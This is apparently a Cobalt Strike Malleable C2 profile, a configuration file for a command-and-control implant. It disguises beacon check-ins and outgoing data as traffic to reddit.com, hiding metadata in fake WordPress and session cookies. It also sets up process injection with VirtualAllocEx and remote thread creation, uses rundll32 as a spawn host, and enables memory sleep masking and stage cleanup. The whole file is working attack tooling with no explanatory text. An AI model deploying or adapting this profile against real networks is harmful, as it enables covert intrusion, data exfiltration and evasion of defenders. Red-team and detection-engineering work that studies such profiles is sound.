set sleeptime "5000";
set jitter "22";
set spawnto_x86 "%windir%\syswow64\rundll32.exe";
set spawnto_x64 "%windir%\sysnative\rundll32.exe";
set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9";

http-get {
    set uri "/lt.css";
    set verb "GET";

    server {

        output {
            prepend "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
            base64;
            base64url;
            print;
        }
    }

    client {
        header "Host" "reddit.com";
        header "Connection" "close";

        metadata {
            mask;
            base64;
            prepend "wordpress_logged_in_1870a829d9bc69abf500eca6f00241fe=";
            header "Cookie";
        }
    }
}

http-post {
    set verb "POST";
    set uri "/nl";

    client {
        header "Host" "reddit.com";
        header "Connection" "close";
        header "Content-Type" "text/plain";

        output {
            netbiosu;
            base64;
            print;
        }

        id {
            base64;
            prepend "__session__id=";
            header "Cookie";
        }
    }
}

stage {
    set cleanup "1";
    set sleep_mask "179186";
}

process-inject {
    set startrwx "false";
    set userwx "false";
    set min_alloc "11053";

    transform-x86 {
        append "\x90\x90\x90\x90\x90";
    }

    transform-x64 {
        append "\x90\x90\x90\x90\x90";
    }

    execute {
        CreateThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
    set allocator "VirtualAllocEx";
}
